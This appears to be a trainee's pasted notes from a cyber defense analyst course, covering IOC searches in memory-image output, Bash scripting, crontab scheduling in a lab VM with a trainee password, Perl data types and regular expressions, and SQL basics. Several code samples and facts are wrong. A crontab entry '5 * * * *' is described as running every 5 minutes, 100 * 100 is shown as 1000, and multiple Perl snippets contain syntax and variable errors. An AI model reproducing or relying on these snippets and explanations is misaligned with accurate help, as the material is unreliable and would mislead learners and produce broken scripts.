cat ~/Documents/IOCs.txt | xargs -i egrep -i {} *.txt


![image](https://github.com/user-attachments/assets/b78737ed-eb2f-47ce-b34f-72bfffab502f)

8. Review the output to see IOCs/artifacts are present in the image and from which plugins/files:

 ![image](https://github.com/user-attachments/assets/6eddf1f1-ca00-48ab-9210-52575b8346ef)
  
![image](https://github.com/user-attachments/assets/43d5c42f-afc7-4113-9283-741084f568e3)

![image](https://github.com/user-attachments/assets/99f41457-8e6f-45b1-a351-1f4f41f570fe)


![image](https://github.com/user-attachments/assets/a6b05fde-c37d-4df5-accd-ee55470b6f9b)

![image](https://github.com/user-attachments/assets/19458da1-087b-4cba-ae2b-3f3736453d34)


![image](https://github.com/user-attachments/assets/bbb2b4b0-a13b-42ff-8c4a-1e5f9d406aeb)


Compound Commands
A compound is a command executed in a subshell environment, current shell environment, or group, or evaluated as an arithmetic expression or conditional expression — or it may be a series of commands executed within several flow control constructs. Commands can be executed in the foreground (sequentially) and in the background (asynchronously). Multiple commands are separated by a semicolon, and any command that has the ampersand (&) associated with it is executed asynchronously while the next command is started before waiting for the background command to finish. Table 15.1-1 describes the format for some compound command constructs. Additional explanations follow later in this lesson.

![image](https://github.com/user-attachments/assets/5f0a3b31-d6d2-4560-bf78-6c8e7bf32a1b)


Quoting
Quoting is used to remove the special meaning of certain characters or words to the shell. This disables any special treatment those characters or words may have and forces the shell to treat reserved words or characters as the actual character needed and not use them for things like parameter expansion. The following meta-characters must be quoted to prevent them from separating words:

﻿

| & ; ( ) < > ! space tab﻿

﻿

Bash includes three types of quoting: escape character, single quotes, and double quotes. The escape character, a non-quoted backslash (\), preserves the literal value of the next character. Quoting characters in single quotes (') preserves the literal value of each character within the quotes. A single quote may not occur between single quotes, even when preceded by a backslash. Quoting characters with double quotes (") preserves the literal value of each character, with the exception of $, ', \, and, when history expansion is enabled, !. The backslash retains its special meaning only when followed by $, ', ", \, or <new line>.


Flow Control
The ability of Bash and other scripting languages to perform the same operation on multiple objects, perform loops, and branch execution paths is one of the most powerful aspects of scripting. The concept of flow control and conditional execution is present in all programming languages. The syntax is usually what differs between each language or environment. Bash uses the constructs in Table 15.1-2 for controlling flow for which commands are executed under specific conditions.

﻿![image](https://github.com/user-attachments/assets/2a71ddab-87c2-4b1c-a9fb-7adb97a7b466)

Statements
case Statements
﻿

case statements allow for complex conditional statements and branches of execution to be tested in a way that does not require multiple if statements.

case word in
    pattern1)
        statements
    ;;
    pattern2)
        statements
    ;;
    *)
        statements
    ;;
esac
﻿

if Statements
﻿
if list1; then list2; [ elif list3; then list4; ] … [else list5; ] fi
﻿

Conditional statements using if are one of the most common ways to control the execution of a script and perform specific actions based on a condition. The if conditional performs a test and then executes a list of commands. Additional tests may be performed if the previous test was non-zero, or false, using the elif construct, which can be thought of as else if. There is also a last case that is executed if all previous tests in the if block return false using the else construct. 

Conditionals
Conditional expressions are used in commands that require a predefined condition to be satisfied. When the condition is satisfied, the procedure executes. Table 15.1-3 provides the syntax used to define a conditional statement using conditional expressions: 

﻿![image](https://github.com/user-attachments/assets/d99dce23-5c67-4609-98be-9b30dc05c128)

 

The key difference between the conditional operators is the number of conditions that must be true to execute the command. With the && operator, all expressions used in the statement must be true. With the || operator, only one expression used in the statement must be true. 

![image](https://github.com/user-attachments/assets/c80f4c48-5ddc-434b-8eeb-458c53f17350)

![image](https://github.com/user-attachments/assets/2a4b989f-c0b5-4876-a7ba-fd8512b0a36a)

![image](https://github.com/user-attachments/assets/e85c175f-3ec1-4928-89ce-3a4529565378)

Functions
Bash functions allow users to group pieces of code, or code blocks, for reuse and efficient code design. Bash functions can be named and saved for later use within scripts. To declare a function, the following syntax is used:

<function name> () {
<commands>
}
﻿

Functions can also be defined using one line of code:


<function name> () { <commands>; }
﻿

The following is an example of the function Host1:


Host1() {
echo "cda-wks1"
}
﻿

When the Host1 function is called upon, the following output is returned:

echo $(Host1)

cda-wks1


Arrays
An array is a defined variable that contains multiple values. The user may define any variable as an array, with no limit to the number of values contained within it. An array variable is zero based, meaning that the first item in the array is indexed with the number 0. The following syntax is used when defining an array:


variable_name=(value1 value2 value3) 
﻿

The following is an example of the variable SCAN:


SCAN="tcp 127.0.0.1 32"

 Dictionaries
Dictionaries allow users to define a collection of keys and values. Dictionary objects are defined with the following syntax:


dictionary_name=(
  [key_1]="value"
  [key_2]="value"
  [key_3]="value"
)
﻿

Below is an example of the dictionary Host1: 


Host1=(
  [Name]="cda-wks1"
  [OS]="win10"
  [BitVersion]="x64"
)
﻿

To return a specific value from the dictionary, the following syntax is used:


echo ${dictionary_name[key]}
﻿

The following syntax returns the key Name from the Host1 dictionary:


echo ${Host1[Name]}
﻿

The following output is returned:


cda-wks1

Scripting Practice
Develop the Script
﻿

Create a script to read log files in the /var/log/ directory in search of a particular predefined string over a specific timeframe. If the string is found, append that log entry into a file on the desktop. 

﻿![image](https://github.com/user-attachments/assets/2b502332-757e-48e8-8b6f-4be1a2819ad1)

 Execute the Script


Access and execute the newly developed script to query the /var/log directory in search of strings of text.


Workflow


1. In a new session, open Terminal. 


2. Access root privileges by running the following command:

[trainee@lin-hunt-cen ~]$ sudo su



When prompted, enter the password for the trainee account:

CyberTraining1!



3. To execute the log_script, run the following command:

[root@lin-hunt-cen trainee]# bash ./log_script



After the command is executed, the following input request appears within the terminal:

Enter String:



4. Enter the following string, and select Enter:

Enter String: root



The script executes, looking for all occurrences of the string root within the /var/log directory. The results are displayed in the current terminal session. The script looks for any string that the user defines. To search for another string, the script can be executed again with the desired string. 


The results of executing the script are similar to Figure 15.1-3 (but may differ slightly):

![image](https://github.com/user-attachments/assets/39963d56-be48-4603-97a8-2b9272bfac9b)

Bash Scripts and Crontab
Within the Linux OS, the crontab allows users to schedule commands and processes to execute on a set interval. Crontab includes five fields, shown in Table 15.1-4:

﻿![image](https://github.com/user-attachments/assets/bb6d84de-8252-4ff7-a4a8-2daeeeeb37ed)

 All crontab fields are included in the syntax for scheduling a command. The crontab syntax is ordered as shown below:


MIN HOUR DOM MON DOW


A crontab field contains an asterisk (*), which represents all possible values in the specific field. 


Table 15.1-5 provides examples of scheduled commands within crontab:

![image](https://github.com/user-attachments/assets/6518e4fe-5e20-4abd-a7d6-51c68261da25)

![image](https://github.com/user-attachments/assets/0227dd05-df7a-4ee5-a71a-0c4b181cb624)

Knowledge Check Explained
The following syntax schedules a command to execute every day at midnight (12 a.m.):


0 0 * * *
﻿

The 0 value in both the MIN and HOUR fields indicates the command is executed at 00:00, midnight. 

﻿

The * value in the DOM MON DOW fields indicates that the command is executed on all possible values in each field. This means the command executes every day of the month, every month, and every day of the week.

Crontab Practice
Create an Optimal Bash Script for Crontab
﻿

Create a Bash script that queries the /var/log directory and can be executed on a scheduled basis.  

﻿

Workflow
﻿

1. Log in to the VM lin-hunt-cent using the following credentials:


Username: trainee
Password: CyberTraining1! 
﻿

2. Open Terminal.

﻿

3. Access root privileges by entering the following command:


[trainee@lin-hunt-cen ~]$ sudo su
﻿

When prompted, enter the password for the trainee account:


CyberTraining1!
﻿

4. To create a new script, enter the following command:


[root@lin-hunt-cen ~]# vi log_script_2
﻿

The log_script Bash script developed during the previous section of this lesson required user input to query the /var/log directory. A script that requires user input is a quick and dynamic method to query based on different strings that may change frequently. To use crontab, the script requires modification, removing the required user input for script execution. If it is not removed, when the script executes, it waits for input and crontab does not complete the execution. For this lesson, a new script, log_script_2, is developed and used. 

﻿

5. Enter i to put Vi in insert-text mode. To start the script, enter the following code on line 1:


#!/bin/sh
﻿

6. Enter the following on line 2:


grep -ir root /var/log >> /home/trainee/Desktop/detections.txt
﻿

The grep command searches for the word root in /var/log. The -i following the grep command keeps the search case insensitive. 

﻿

The >> operator takes the results of the grep command and outputs it in a file, detections.txt, located on the path /home/trainee/Desktop. The >> operator appends the document; if the document contains text, it adds text to the document.  

﻿

11. Select esc, and enter :wq! to exit and save the crontab. 

﻿

12. Enter the following command to run the script:


[root@lin-hunt-cen ~]# bash log_script_2
﻿

13. Enter the following command to view the output in detections.txt:


[root@lin-hunt-cen ~]# vi /home/trainee/Desktop/detections.txt
﻿

Schedule a Bash Script
﻿

Access the crontab to implement scheduling automation for a Bash script. 

﻿

Workflow
﻿

1. Log in to the VM lin-hunt-cent using the following credentials:


Username: trainee
Password: CyberTraining1! 
﻿

2. Open Terminal.

﻿

3. Access root privileges by entering the following command:


[trainee@lin-hunt-cen ~]$ sudo su
﻿

When prompted, enter the password for the trainee account:


CyberTraining1!
﻿

4. Enter the following command:


[root@lin-hunt-cen ~]$ sudo crontab -l
﻿

The following output is returned:


no crontab for root
﻿

Crontab is accessed by the crontab operator.  crontab -l lists all crontab scheduled tasks on the machine. The output confirms that there are no current inputs within crontab.

﻿

5. Enter the following command:


[root@lin-hunt-cen ~]$ systemctl status crond.service
﻿

The command confirms the status of the crond.service. The crond.service is the service associated with the crontab scheduled tasks. The output confirms the crond.service is active (running). 

﻿

If the cron.service is not running, the following command is used to start the service:


[root@lin-hunt-cen ~]$ systemctl start crond.service
﻿


6. Enter the following command:


[root@lin-hunt-cen ~]$ sudo crontab -e
﻿

crontab -e is the command used to define scheduled tasks.

﻿


7. Select i to access edit mode.

﻿


8. On the top line of the window, enter the following command, with spaces between each asterisk (*):


5 * * * * ~/log_script_2
﻿

The command schedules the log_script_2 to execute every 5 minutes. 

﻿

NOTE: Each asterisk (*) represents a different time category, in the following order:

﻿

1. Minute (from 0 to 59)

2. Hour (from 0 to 23)

3. Day of month (from 1 to 31)

4. Month (from 1 to 12)

5. Day of week (from 0 to 6, where 0 = Sunday)

﻿

9. Select esc, and enter :wq! to exit and save the crontab. 

![image](https://github.com/user-attachments/assets/2a216246-b26a-4903-9eb2-007bfb82ebcd)

![image](https://github.com/user-attachments/assets/683ed54c-472a-4521-8d78-54773eb99916)

Schedule and Use Bash Scripting
Read the following scenario. Then use the skills and information regarding Bash scripts and the crontab to execute a script and schedule it to run automatically. Use the knowledge gained in the scenario and throughout the lesson to answer the questions that follow. 

﻿

Scenario 
﻿

A Cyber Protection Team (CPT) has been tasked with investigating account activity across a wide range of log files. Use the scripts developed in the previous lab to query directories.

﻿

Workflow
﻿

1. Log in to the VM lin-hunt-cent using the following credentials:


Username: trainee
Password: CyberTraining1! 
﻿

2. Open a new Terminal session.

﻿

3. Access root privileges by entering the following command:


[trainee@lin-hunt-cen ~]$ sudo su
﻿

When prompted, enter the password for the trainee account:


CyberTraining1!
﻿

4. Query the /var/log directory using the log_script for the term sudo.

﻿

5. When done, exit the script by pressing CTRL-C.

   ############use script from earlier, looking for the term sudo################

   ![image](https://github.com/user-attachments/assets/51b6e199-b0b3-4365-ac5e-b642985a26c7)


Logs with Sudo
Using the log_script, sudo is contained in logs with the paths /var/log/audit/audit.log and 
/var/log/secure.

﻿

Both the audit.log and secure log collect and monitor data related to permissions and user accounts. Any use of sudo on the host is collected and appears in a query of the logs. 


Modify a Script
sudo is a command that allows the user to run an elevated prompt, giving the necessary permissions to change and modify host systems and processes. Uses of the sudo command should be reviewed for any unexpected or unusual activity. 

﻿

Workflow
﻿

Modify the log_script_2 to search for the term sudo within the /var/log directory, and output the script results into a document titled detections_sudo.txt, located in the /home/trainee/Desktop folder.

![image](https://github.com/user-attachments/assets/c2be34ec-db32-4c9c-80cc-c51bb129db82)


![image](https://github.com/user-attachments/assets/0a2d3cd0-4999-4002-9561-d76f9b73f2d1)

Which command is used to list all crontab scheduled tasks on the host?
![image](https://github.com/user-attachments/assets/c31daf79-e34a-4935-8826-2073ae53b5b4)

Which command is used to modify the crontab on the host?
![image](https://github.com/user-attachments/assets/9e5d307c-0236-4086-b051-b5d1e6ea7eb3)

Which syntax schedules log_script_2 to execute at 9 a.m., 12 p.m., and 5 p.m. every weekday?
![image](https://github.com/user-attachments/assets/a302483c-f3e6-4856-8c30-64ff38a200e1)

Crontab Syntax
The following syntax schedules log_script_2 to execute at 9 a.m., 12 p.m., and 5 p.m. every weekday:

﻿

0 9,12,17 * * 1-5
﻿

In the syntax, the * indicates that the script can execute on all possible values in each field. For this script, the fields are MIN, DOM, and MON. 9,12,17 indicates the hours the script executes, meaning 9 a.m., 12 p.m., and 5 p.m.. The numbers 1-5 in the DOW field indicate that the script executes on Monday (1), Tuesday (2), Wednesday (3), Thursday (4), and Friday (5) (weekdays). 

 

Crontab can be a complex syntax to use without practice. The resources below assist in providing proper syntax when a desired schedule is input. 

﻿



#############CDAH-M15L2-Perl and Perl Regular Expressions###############

Perl Scripting Overview
Perl is a stable, general-purpose programming language used for a wide variety of tasks, such as system administration, web development, and programming. Perl can integrate into such databases as Oracle, MySQL, and PostgreSQL and can also work with other markup languages such as Hypertext Markup Language (HTML) and Extensible Markup Language (XML). 

﻿

Perl, which is open source, is popular in web programming due to its text manipulation capabilities and rapid development cycle. Perl also has the ability to work in an interactive mode. 

﻿

The following command prints the output Hello World:

perl -e 'print "Hello World\n"'
﻿

Perl also allows users to add comments to code to provide supporting information. This can be done with the following format:

# This is a comment.  

Perl Data Types
An interpreter is a program that directly executes program instructions written in one of the many high-level programming languages. The interpreter transforms the high-level program into an intermediate language that it then executes.

﻿

The Perl interpreter automatically selects one of three data types in Perl, based on the data itself. The data types are scalars, arrays, and hashes. 

﻿

Scalars
﻿

A scalar, the most basic Perl data type, represents a single unit of data: an integer, a floating point, a character, a string, a paragraph, or an entire web page. A scalar is preceded by a dollar ($) symbol. 

﻿

Numeric scalars hold such values as whole numbers, integers, and floating points. Example code using numeric scalars is as follows:

$integer = 100;
$negativeint = -150;
$floating = 11.5;

print "integer = $integer\n";
print "negative = $negativeint\n";
print "floating = $floating\n";

#Output
integer = 100
negative = -150
floating = 11.5
﻿

String scalars hold values like a word or paragraph. String scalars require double-quoted strings, as single quotes behave differently with a string. 

﻿

Example code using string scalars is as follows:

$var = "This is a string.";
$qoute = 'This is a single quoted string - $var';
$double = "This is a double quoted string - $var";
$escape = "This is an example of an escape -\tHello, World!";

print "var = $var\n";
print "quote = $quote\n";
print "double = $double\n";
print "escape = $escape\n";

#Output
var = This is a string.
quote = This is a single quoted string - $var
double = This is a double quoted string - This is a string.
escape = This is an example of an escape - Hello, World!
﻿

The scalar data type also includes scalar operations, such as addition, subtraction, and multiplication, that can be performed on strings and integers. 

﻿

Arrays
﻿

An array is a variable that stores an ordered list of scalar values. Array variables are preceded by the @ symbol. To refer to a single element within an array, the $ symbol prefixes the variable name, followed by the index of the element in square brackets. 

﻿

When an array is created, the data is populated within parentheses or the qw// operator. The qw// operator returns a list of strings separating the delimited string by white space. An example of using the qw// operator is the following:

@days = qw/Monday
Tuesday
…
Sunday/;
﻿

When individual elements of an array are being accessed, the variable must be prefixed with a $, and the element index must be appended within the square brackets [ ] after the name of the variable. An example is as follows:

@months = qw/Jan Feb Mar Apr May Jun Jul Aug/;

print "$month[1]\n";
print "$month[5]\n";

#Output
Feb
Jun 
﻿

Array indexes start from 0, so to access the first element of an array, 0 is provided as the index number. A negative number may also be provided as an index number, in which case the elements would be counted from the end instead of from the beginning of the array, and -1 would be the last element in the array. 

﻿

A shortcut exists in Perl arrays that can be used for sequential numbers and letters. Using sequential number arrays, users avoid entering all elements of a series (for example, all elements from 1 to 100 or from a to z). Examples are as follows:

@array = (1..9); #array with numbers 1 to 9
@array = (a..h); #array with letters from a to h
﻿

Hashes
﻿

A Perl hash, also called an associative array, is defined by key-value pairs. Descriptive keys are used to access a hashed element. The prefix for a hash variable is a percentage (%) symbol. Elements within a hash are separated by a comma or by using => as an alias. This makes it easier to distinguish the key-value pairs when they are in a large list. An example of a simple hash is as follows:

%employeedata = ('Jeff' => 31, 'Lauren' => 24, 'Andrew' => 56);    
﻿

The above example is one way to create a hash in a list format. Hashes can also be created by assigning a value to a key on a one-to-one basis. This method is useful for smaller amounts of data and makes reading the data easier. 

﻿

To access individual elements from a hash, the variable must be prefixed with a $, and the element key must be appended within curly brackets { } after the name of the variable. An example is as follows:

%employeedata = ('Jeff' => 31, 'Lauren' => 24, 'Andrew' => 56);
print "$employeedata{'Jeff'}\n";
print "$employeedata{'Lauren'}\n";

#Output
31
24
﻿

It is also possible to extract part of a hash in the form of an array. This can be done using the @ prefix for the array variable to store the returned value in a list form. An example is as follows:

%employeedata = ('Jeff' => 31, 'Lauren' => 24, 'Andrew' => 56);
@array = @employeedata{'Jeff', 'Andrew'};
print "Array : @array\n";

#Output
Array : 31 56
﻿

With the Perl hash data type, it is possible to return a list of all the keys or all the values within a hash (using the keys function or values function, respectively). The syntax for the keys function is keys %hash, and the syntax for the values function is values %hash. Examples are as follows:

%employeedata = ('Jeff' => 31, 'Lauren' => 24, 'Andrew' => 56);
@names = keys %employeedata;
print "$names[0]\n";
print "$names[1]\n";
print "$names[2]\n";

#Output
Jeff
Lauren
Andrew

%employeedata = ('Jeff' => 31, 'Lauren' => 24, 'Andrew' => 56);
@ages = values %employeedata;
print "$ages[0]\n";
print "$ages[1]\n";
print "$ages[2]\n";

#Output
31
24
56

Operators and Variables
In Perl, numerous operators exist that provide different functions and operations for a script. Perl provides operators that can help with numeric operations, including arithmetic, Boolean, and bitwise operations.

﻿

Arithmetic operators deal with basic math operations of adding, subtracting, multiplying, and dividing. Examples of these operators in use are as follows:

print 10 + 25, "\n";
print 30 - 20, "\n";
print 100 * 100, "\n";
print 50 / 2, "\n"; 

#Output
35
10
1000
25
﻿

When combining the above operators, Perl performs the calculations using operator precedence, where multiplication and division have higher precedence than addition or subtraction. Parentheses force Perl to perform the calculations based on user preference. 

﻿

Perl equality operators, or relational operators, compare numbers within a script. Table 15.2-1 provides descriptions and examples of the equality operators:

﻿![image](https://github.com/user-attachments/assets/2b0e2ee1-e747-4977-82f3-9ca5080b6074)

 Perl also has operators that can be used for string comparison. Table 15.2-2 provides descriptions and examples of these operators:

 ![image](https://github.com/user-attachments/assets/61fd4d34-4a18-4474-864c-e60db339dfca)

 

Perl variables are the reserved memory locations that can store values. When a variable is created, memory space is reserved for it. Based on the data type of a variable, the interpreter decides what can be stored in the reserved memory. By assigning different data types to variables, integers, decimals, and strings can be stored in these variables. 


File, Directory, and Error Handling
File handling in Perl consists of associating a file handle with a file and using a variety of operators and functions to read and update the data stored with the datastream associated with the file handle. A file handle is an internal Perl structure that associates a physical file with a name. Through the file handle, it is possible to read and write from or to the file, depending on how the file is opened. 

﻿

The open() function can be used to open files. This function has three parameters that can be used:

Filehandle: The variable that associates with the file (for example, FH).
Mode: The mode in which the file is opened. (See Table 15.2-3 for modes.)
Filename: The path to the file being opened.
﻿Table 15.2-3 provides the operators and descriptions of the modes that can be used when opening a file:

﻿![image](https://github.com/user-attachments/assets/a1e2e76c-03a5-4ec2-9cd7-3d03f71a5a4b)



The following is an example of opening a file in read mode:
open(FH, '<' 'home/trainee/test.txt');

while(FH) {
   print "$_";
}



To close a file handle in Perl, the close() function is used. Once a file is processed, it should be explicitly closed. If no file handle is specified, Perl closes the currently selected file handle. An example using syntax for the close function is as follows:
open(FH, '<' 'home/trainee/test.txt');

while(FH) {
   print "$_";
}
close(FH)



The read function reads a block of information from the file handle. The syntax for the read function is as follows:
read FILEHANDLE, SCALAR, LENGTH, OFFSET



The length of the data read is defined by LENGTH, and the data is placed at the start of SCALAR if no OFFSET is specified. The function returns the number of bytes read on success, 0 if the end of file is reached with no bytes read, or undef if there was an error. 


The main function used to return information from file handles is the print function. The syntax for the print function is as follows:
print FILEHANDLE LIST



The print function prints the value of LIST to FILEHANDLE or to the current output file handle. An example of the print function is as follows:

print "This is a test"\n";



The rename() function can be used to change the name of a file, as shown in the following example:

rename("/home/trainee/test.txt", "/home/trainee/file1.txt");

![image](https://github.com/user-attachments/assets/ea442693-8296-4057-af88-de83455c7261)

Perl has multiple ways to list all the files within a directory. One of the simplest ways is to use the glob() operator, and the opendir() function also makes this possible. Examples of these functions is as follows (where $dir represents the directory of the files to be listed):
$dir = "home/trainee/*";
@files = glob($dir);

foreach(@files) {
	print $_. "\n";
}


$dir = "home/trainee/*";
opendir (DIR, $dir)
while(($filename = readdir(DIR))) {
	print("$filename\n");
}



Directories may be created, removed, or changed by using the mkdir, rmdir, or chdir function, respectively. These functions require the correct permissions to create or remove a directory. 


Perl has multiple functions for handling errors. The warn function raises a warning message printed to STDERR. This function is useful for printing a warning to a user. The die function is similar to warn but will also exit the script. The die function can be used if the script must be stopped due to an error in the program. Examples of the warn and err functions are as follows:
chdir('/home') or warn "Can't Change Directory";


chdir('/home') or die "Can't Change Directory";


What is the command to run 'print "Hello World\n"' in interactive mode?
![image](https://github.com/user-attachments/assets/c25174af-1c53-4301-9911-ba7dba9e0125)


Perl Regular Expressions
A Perl Regular Expression (RegEx) is a pattern that provides a flexible and concise means to match a string of characters. A RegEx may be simple or complex, depending on what pattern is being matched. The method for applying a RegEx is to use the pattern-binding operators =~ and !~. The =~ is a test and assignment operator. The operator !~ is just like =~, except the return value is negated in the logical sense. Perl includes three RegEx operators, as follows:

m// - Match
s/// - Substitute
tr/// - Transliterate

The forward slashes in each operator act as a delimiter for the specified RegEx. If any delimiters are being used, they can be used in place of a forward slash.

﻿

The match operator is used to match a RegEx with a string or statement. The string that is passed to the match operator can be enclosed within any character that can be used as a delimiter to a RegEx. For example, m// is the same as m{}, m(), or m><. They are all valid delimiters for the RegEx. The only difference is that when using the forward slashes as delimiters, the m from m// can be omitted. When using any other delimiters, however, the m must be included as the prefix.

﻿

The match operator also has its own set of modifiers that modify the RegEx, as follows:

i - Makes the match case insensitive.
m - Specifies that if the string has newline characters, the ^ and $ operators now match against a newline boundary instead of a string boundary.
o - Evaluates the expression only once.
s - Allows the use of . to match a newline character. 
x - Allows the use of white space in the expression for clarity.
g - Globally finds all the matches.
cg - Allows the search to continue even after a global match fails.
﻿

In addition to the operators above, the ?PATTERN? operator can be used to match only once within the string that is being searched.

﻿

Perl has RegEx variables that all have different meanings. The $& contains the entire matched string, $` contains everything before the matched string, and $' contains everything after the matched string, as the following examples show:

############down below look in between // in this example =~ m/is/; ########################

$string = "This is a test string.";
############$string =~ m/is/;#################
print "Before: $`\n";
print "Matched: $&\n";
print "After: $'\n";

#Output
Before: This
Matched: is
After: a test string.
﻿

The substitution operator s/// allows for matching text to be replaced with new text. The syntax for this operator is s/PATTERN/REPLACEMENT/;. The PATTERN is the RegEx for the text being searched for. The REPLACEMENT is a specification for the text or RegEx being used to replace the found text. 

﻿

Similar to the match operator, the substitution operator also has its own set of modifiers, as follows:

i - Makes the match case insensitive.
m - Specifies that if the string has newline characters, the ^ and $ operators now match against a newline boundary instead of a string boundary.
o - Evaluates the expression only once.
s - Allows the use of . to match a newline character. 
x - Allows the use of white space in the expression for clarity.
g - Replaces all occurrences of the found expression with the replacement text.
e - Evaluates the replacement as if it were a statement and uses its return value as the replacement text. 

The translation, or transliteration, operator does not use regular expressions for its search or replacement values. The translation operators are tr/SEARCHLIST/REPLACEMENTLIST/cds and y/SEARCHLIST/REPLACEMENTLIST/cds. The translation replaces all occurrences of the characters in SEARCHLIST with the corresponding characters in REPLACEMENTLIST. 

﻿

Standard Perl ranges can also be used with the translation operator. This allows ranges of characters to be specified either by letter or number to be replaced. For example, to change the case of the string, the following syntax can be used:

$string =~ tr/a-z/A-Z/;
﻿

The translation operator also has a list of operators that can be used to modify the characters. The following are the operators related to translation:

c - Complements SEARCHLIST.
d - Deletes the characters matching SEARCHLIST that do not have a corresponding entry in REPLACEMENTLIST.
s - Removes the duplicate sequences of characters that were replaced.

Other, more complex regular expressions can be used to match anything that is needed for a given situation. Table 15.2-5 provides some of the most common complex regular expressions:

﻿![image](https://github.com/user-attachments/assets/92174502-c144-461b-9d28-c898f127934c)


What is the RegEx pattern for matching white space?

![image](https://github.com/user-attachments/assets/13e51690-100a-4636-b8c4-c27c6e8a8198)


Understanding Relational Databases
A relational database uses structure to quickly identify and access data. The data within an RDBMS is stored in database objects called tables. A table is a collection of related data entries and consists of multiple columns and rows. A table is the most common form of data storage in a relational database. Tables can be linked based on common data from each table. This allows users to retrieve an entirely new table from data in one or more tables with a single query. This also allows businesses to understand the relationships between the data within the tables. 

﻿

Every table is broken down into smaller entities called fields. The field within a table is a column designed to hold specific data about every record in the table. A record is the individual, specific entry that exists within a table. A record is a row within a table. Table 15.3-1 is an example of a table that contains fields and records:


![image](https://github.com/user-attachments/assets/a13c671e-70ca-44c8-993e-f93a3aedd434)


In the above example, Order Number, Name, and Amount Due are all fields, whereas 1, Steve, $56 represents one record.


A NULL value in a table is a value that is blank. A field with a NULL value is a field with no value; the field was left blank during record creation.  A NULL value is different from a zero value or a field that contains spaces. 


SQL constraints are the rules that are enforced for the data in a table. Constraints are used to limit the type of data that can go into a table. This ensures that the data in the table is accurate and true. If a violation occurs between a constraint and the data action, the action is aborted.
 
Constraints may be either column level or table level. Column level applies only to one column, whereas table-level constraints apply to the entire table. 


The following are some of the most commonly used constraints:

NOT NULL: Ensures that a column cannot have a NULL value.
UNIQUE: Ensures that all values in a column are different.
PRIMARY KEY: A combination of a NOT NULL value and a UNIQUE value. Uniquely identifies each row in a table.
FOREIGN KEY: Prevents actions that would destroy links between tables.
CHECK: Ensures that the values in a column satisfy a specific condition.
DEFAULT: Sets a default value for a column if no value is specified.
CREATE INDEX: Is used to create and retrieve data from the database quickly.

An RDBMS also has data integrity that exists within each database. The following are the categories of each type of data integrity:

Entity integrity: Ensures that no duplicate rows exist in a table.
Domain integrity: Enforces valid entries for a given column by restricting the type, format, or range of values.
Referential integrity: Ensures that rows used by other records cannot be deleted.
User-defined integrity: Enforces some specific business rules that do not fall into the entity, domain, or referential integrity types. 

Comparison of Relational and Non-Relational Databases


Non-relational databases also exist and can be used to store data. However, non-relational databases do not have tables or rows. Instead, non-relational databases use a storage model based on the specific requirements of the data being stored. 


Four main types of non-relational databases exist:
Document data stores
Column-oriented databases
Key-value stores
Graph databases

These four types of non-relational databases may be combined, depending on the data being stored.


Non-relational databases are often used for the following reasons:
Non-relational databases can store large amounts of data with little structure.
Based on business requirements, non-relational databases can provide flexibility and scalability to change.
Non-relational databases are document oriented and can capture all types of data, including unstructured data. 

Relational databases work with structured data and use constraints to maintain a high level of data integrity. These databases also have indexing capabilities that allow for faster data queries. Relational databases are more secure than non-relational databases and add multiple levels of data integrity, which non-relational databases cannot do. Relational databases allow the ability to write complex SQL queries and are optimal for applications that have heavy-duty transactions. 


Some commonly used relational databases are MySQL, Oracle, SQLite, PostgreSQL, and Microsoft SQL Server. Non-relational database examples are MongoDB, BigTable, Redis, RavenDB, Cassandra, and CouchDB. 

![image](https://github.com/user-attachments/assets/12ac3068-a600-4546-97e7-e0a75b8d9cf2)

SQL Syntax
The SQL syntax often reads like a natural language. For example, an SQL statement or command begins with a verb that describes the action, such as SELECT, INSERT, UPDATE, or DELETE. Following the verb, the subject and conditions that can be evaluated as true, false, or unknown are provided. 

﻿

Every SQL statement ends with a semicolon (;) to signal that the statement has ended. SQL is also case insensitive: writing SELECT or select has the same meaning in SQL. (This lesson uses all-uppercase command verbs — for instance, SELECT — for clarity.) When working with MySQL, the table names are case sensitive. 

Interaction Commands
To interact with a database in SQL, users must enter queries with a specific syntax to perform commands on the database. 

﻿

The USE command is appropriate when a user wants to access a specific database among multiple SQL databases. The syntax is as follows:

USE database_name;
﻿

The COMMIT command saves all modifications made in the current transaction since the last commit. If a user inserts multiple records into a table, using the COMMIT statement saves any changes made. The syntax is as follows:

COMMIT;
﻿

The ROLLBACK command reverses any changes done during the current transaction. The command reverts all modifications to the point at which the last COMMIT command was run. The syntax for this command is as follows:

ROLLBACK;
﻿

The SHOW command is a special query for viewing the information schema of any records stored in a database. This command can show databases, tables, columns, and many administration-level records. Examples of the SHOW command syntax are as follows:

SHOW DATABASES; displays all existing databases on an SQL server.
SHOW TABLES; displays all tables within a database.
SHOW COLUMNS FROM tablename; displays the columns of a table.
SHOW ERRORS; displays any database errors.
﻿

Definition Commands
Two different CREATE commands may be used in SQL: CREATE DATABASE and CREATE TABLE.

﻿

CREATE DATABASE is used to create a new database within SQL. The syntax is as follows:

CREATE DATABASE database_name;
﻿

Each database name should be unique within the RDBMS. Administrative privileges are needed to create a new database. 

﻿

SQL databases require tables, comprising multiple rows and columns, to store data. The CREATE TABLE command is used to create such a table. A table name, column names, type of data to be stored, and size of the data must be provided during table creation. The syntax of the CREATE TABLE command is as follows:   


CREATE TABLE table_name
(
column1 data_type(size),
column2 data_type(size),
column3 data_type(size),
....
);
﻿

Each syntax element is described as follows:

table_name:  Name of the table.
column1, column 2, column 3, etc.: Names of the table columns.
data_type: Type of data to be stored in the particular column (for example, int for integer data).
size: Size of the data to be stored in a particular column. For example, if, for a given column, the data_type is specified as int and size as 10, then this column can store an integer number of a maximum of 10 digits.

The DROP TABLE command removes a table definition and all the data, indexes, triggers, constraints, and permissions for that table. Once a table is deleted, all the information that was in that table is also deleted. The syntax for this command is as follows:

DROP TABLE table_name;
﻿

The ALTER TABLE command adds, deletes, or modifies columns in an already existing table. This command can also be used to remove constraints on an existing table. The ALTER TABLE command has a variety of uses:

ALTER TABLE table_name ADD column_name datatype; adds a new column to an existing table.
ALTER TABLE table_name DROP COLUMN column_name; drops a column in an existing table. 
ALTER TABLE table_name MODIFY COLUMN column_name datatype; changes the DATA TYPE of a column in a table.
ALTER TABLE table_name MODIFY column_name datatype NOT NULL; adds a NOT NULL constraint to a column in a table.
ALTER TABLE table_name
 DROP CONSTRAINT MyUniqueConstraint; deletes a constraint from a table.

The CREATE USER statement adds a user to the current database. The syntax is as follows:

CREATE USER username FOR LOGIN login_name;
﻿

After the user is created, the username (login_name) and password are added. The syntax is as follows:

CREATE LOGIN login_name WITH PASSWORD= 'password';
﻿

Each variation of SQL databases has a slightly different syntax to create a user. For example, the below command is used to create a user with MySQL:  


